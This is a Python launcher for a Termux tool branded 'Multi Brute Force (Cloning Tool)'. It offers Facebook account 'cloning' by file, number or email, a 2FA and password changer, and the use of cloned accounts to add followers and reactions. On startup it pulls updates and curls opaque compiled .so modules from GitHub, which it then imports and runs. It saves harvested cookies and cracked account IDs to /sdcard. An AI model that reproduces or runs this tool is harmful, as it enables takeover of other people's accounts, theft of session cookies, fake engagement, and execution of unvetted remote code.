#!/usr/bin/python3
# -*-coding:utf-8-*-
import json.decoder
import os
# Modules Need Installation !
try:
	import httpx
except:
	os.system('pip install httpx')
try:
	import bs4
except:
	os.system('pip install bs4')
try:
	open('/sdcard/termux-permission', 'w')
except PermissionError:
	os.system('termux-setup-storage')
# Pre-Define Modules (-importing modules-)
from platform import architecture
from os import (system, path, makedirs)
from sys import exit
from json import dumps, load, loads
from subprocess import run
from time import sleep
try:
	from bs4 import BeautifulSoup as bfp
except ModuleNotFoundError:
	system('pip install bs4')
	from bs4 import BeautifulSoup as bfp
# colors "defining colors to use"
c = lambda color: f"\033[1;{color}m"
Y = c('93')
G = c('92')
W = c('97')
R = c('91')
# argv passer (and some extra var)
arch_ = architecture()[0]
lines_ = 54 * "_"
# logo (main banner of tool)
def kwargs(**args):
	return args

try:
	config_data = loads(open('config.json', 'r').read())
except (FileNotFoundError, json.decoder.JSONDecodeError):
	write_me = open('config.json', 'w').write(dumps({'Status': 'OK'}))
	config_data = loads(open('config.json', 'r').read())

try:
   os.mkdir('/sdcard/SYED-ZADA')
except:
	pass

def LOGO(version):
	system('clear')
	return (f"""{W}
     ╔═══╗╔╗──╔╗╔═══╗╔═══╗  ╔════╗╔═══╗╔═══╗╔═══╗
     ║╔═╗║║╚╗╔╝║║╔══╝╚╗╔╗║  ╚══╗═║║╔═╗║╚╗╔╗║║╔═╗║
     ║╚══╗╚╗╚╝╔╝║╚══╗─║║║║    ╔╝╔╝║║─║║─║║║║║║─║║
     ╚══╗║─╚╗╔╝─║╔══╝─║║║║   ╔╝╔╝─║╚═╝║─║║║║║╚═╝║{G}
     ║╚═╝║──║║──║╚══╗╔╝╚╝║  ╔╝═╚═╗║╔═╗║╔╝╚╝║║╔═╗║{W}
     ╚═══╝──╚╝──╚═══╝╚═══╝  ╚════╝╚╝─╚╝╚═══╝╚╝─╚╝
{lines_}

 (+) Developer : SYED SHAWAIZ SHAH & QAISER ABBAS
 (+) Tool Type : Multi Brute Force (Cloning Tool)
 (+) Version   : {version}
 (+) Github    : https://github.com/syedzada1100
{lines_}""")

def ended_data(oks):
	print(lines_)
	print("")
	print(f'[+] The Process Has been Completed ')
	print(f'[+] Total Oks   :{G} ' + oks + c('0'))
	print(f'[+] Cookie Save : /sdcard/SYED-ZADA/cookies.txt')
	print(f'[+] Ok Ids Save : /sdcard/SYED-ZADA/oks.txt')
	print(f'[+] Cp Ids Save : /sdcard/SYED-ZADA/cps.txt')
	print(lines_)
	exit('\n[+] To Run Again Type (python run.py)')

def invalid_select(para):
	print(para)
	sleep(3)
	system('python run.py')

@lambda _: _()
def importer():
	system('clear')
	print(f"\n{G}[+] Checking Updates...\n")
	system("git pull")
	system("git pull")
	if '64' in arch_:
		if not path.exists("pycrypto_qsr.so"):
			system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr.cpython-311.so?raw=true > pycrypto_qsr.so')
			import Syed
		else:
			import Syed
	elif '32' in arch_:
		if not path.exists("pycrypto_qsr32.so"):
			system(f'curl -L https://github.com/syedsahab1122/files/blob/main/pycrypto_qsr32.cpython-311.so?raw=true > pycrypto_qsr32.so')
			import Syed32
		else:
			import Syed32
	else:
		print(f'\n{R}[×] Your Device is Not Supported This Tool !');exit()

@staticmethod
class BIT_:
	def __init__(self, link, filename):
		system('mkdir SimData Dump TwoFactor')
		self.name_ = (filename.split('/')[0]).split('.')[0]
		if arch_ == '64bit':
			if not path.exists(filename):
				system(f'curl -L {link} > {filename}')
				self.sixty_four()
			else:
				self.sixty_four()

		elif arch_ == '32bit':
			filename_ = (filename.split('/')[1]).split('.')[0] + "32.cpython-311.so"
			name = filename.split('/')[1]
			if not path.exists(filename_):
				system(f'curl -L {link.replace(name, filename_)} > {filename.replace(name, filename_)}')
				self.thirty_two()
			else:
				self.thirty_two()
		else:
			print(f'\n{R}[×] Your Device is Not Supported This Tool !');exit()

	def sixty_four(self):
		if 'SimData' in self.name_:
			from SimData import data
		if 'TwoFactor' in self.name_:
			from TwoFactor import Auto
		if 'Dump' in self.name_:
			from Dump import Dump
			Dump.syed()
	def thirty_two(self):
		if 'SimData' in self.name_:
			from SimData import data32
		if 'TwoFactor' in self.name_:
			from TwoFactor import Auto32
		if 'Dump' in self.name_:
			from Dump import Dump32
			Dump32.syed()
class MENU:
	def __init__(self):
		self.LOGO = LOGO
		self.menu = f"""
[01] Start Cloning
[02] 2fa & Pass Changer
[03] File Create menu
[04] Sim data Finder
[05] FB & WP Group
[00] Exit Tool
"""

def Cloning_MENU():
	print('\n[01] File Cloning')
	print('[02] Number Cloning')
	print('[03] Email Cloning')
	print('[04] Random File Cloning')
	print('[05] Followers & React Setting')
	print('[06] Change Default Setting')
	print('[00] Go Back\n')

def Passwords_Choose():
	print('\n[01] Auto Passwords (Beginner)')
	print('[02] Choice Passwords (Advance)')
	print('[03] Go Back\n')

def Method_Choose():
	print('\n[01] M1 For New ID')
	print('[02] M2 For Mix ID')
	print('[03] M3 For All')
	print('[00] Go Back\n')

def user_valid_input(print_me_):
	while True:
		user_input = input(print_me_).lower()
		if user_input in ['y', 'n']:
			return user_input
		print('Invalid input. Please try again.')

def options_for_OKID(vers_):
	if not path.exists('config.json'):
		print(LOGO(vers_))
		re_options_for_OKID()
	else:
		configs = load(open('config.json', 'r'))
		list_ = ['apps', 'cp', 'friends']
		for val in list_:
			if not val in configs:
				print(LOGO(vers_))
				re_options_for_OKID()
				break

def re_options_for_OKID():
	global config_data
	config_write = open('config.json', 'w')
	print('\n[+] Do You Want To Show CP Accounts ?')
	show_cp = user_valid_input('[+] Choose y/n : ')
	print('\n[+] Do You Want To Show Apps And Websites ?')
	show_apps = user_valid_input('[+] Choose y/n : ')
	print('\n[+] Do You Want To Show Ids Friends ?')
	show_friends_old = user_valid_input('[+] Choose y/n : ')
	config_data.update(kwargs(cp=show_cp.lower(),
							  apps=show_apps.lower(),
							  friends=show_friends_old.lower()))
	config_write.write(dumps(config_data))

def Groups_():
	print('\n[01] Facebook Group')
	print('[02] Whatsapp Group')
	print('[03] Go Back\n')
	gp = input('[•] join Group : ')
	if gp in ['01', '1']:
		run(["xdg-open", 'https://www.facebook.com/groups/499609241591106'])
		system('python run.py')
	elif gp in ['02', '2']:
		run(["xdg-open", 'https://chat.whatsapp.com/DjP6gwInJwK4i3Zq8Y6xDJ'])
		system('python run.py')
	elif gp in ['03', '3']:
		system('python run.py')
	else:
		invalid_select(f'\n{c("31")}[×] Choose Correct Option ! {c("")}')

def eng_bot():
	global config_data
	followers_ids = []
	likes_ids = []
	print('\n[+] Do You Want To Get Followers From Clone Ids ?')
	try:
		followers = input('[+] Choose y/n : ')
		if followers in ['y', 'Y', 'yes', 'Yes']:
			print('\n[+] How Many Ids Do You Want to Add ?')
			limit = input('[+] Put Limit : ')
			for _ in range(int(limit)):
				id_ = input(f"[{_ + 1}] ID : ")
				if id_.isnumeric():
					bcz = httpx.get('https://web.facebook.com/%s' % id_).text
					if 'English (UK)' in bcz:
					   print('\n%s[×] Invalid Profile Link %s !' % (c('31'), c('0')))
					else:
						followers_ids.append(id_)
						print('\n%s[•] Successfully Added ✓ %s' % (c('32'), c('0')))
				else:
					print('\n%s[×] Kindly Put Valid Profile Id That Contain Numbers Only %s !' % (c('31'), c('0')))
		print(lines_)
		print('\n[+] Do You Want To Get Reacts From Clone Ids ?')
		like = input('[+] Choose y/n : ')
		if like in ['y', 'Y', 'yes', 'Yes']:
			print('\n[+] How Many Post Ids Do You Want to Add ? ')
			limit = int(input('[+] Put Limit : '))
			for _ in range(limit):
				post_ = input(f"[{_ + 1}] ID : ")
				if post_.isnumeric():
					bcz = httpx.get('https://web.facebook.com/photo/?fbid=%s' % post_).text
					if 'Comment' in bcz:
						likes_ids.append(post_)
						print('\n%s[•] Successfully Added ✓ %s' % (c('32'), c('0')))
					else:
						print('\n%s[+] Invalid Post Id Pasted %s !' % (c('31'), c('0')))
				else:
					print('\n%s[×] Kindly Put Valid Post Id That Contain Numbers Only %s !' % (c('31'), c('0')))
		with open('config.json', 'w') as config_write:
			config_data.update(kwargs(followers_id=followers_ids))
			config_data.update(kwargs(like_id=likes_ids))
			config_write.write(dumps(config_data))
			print('\n%s[•] All Data Added Successfully ✓ %s' % (c('32'), c('0')))
		system('python run.py')
	except ValueError:
		exit('Invalid Type')
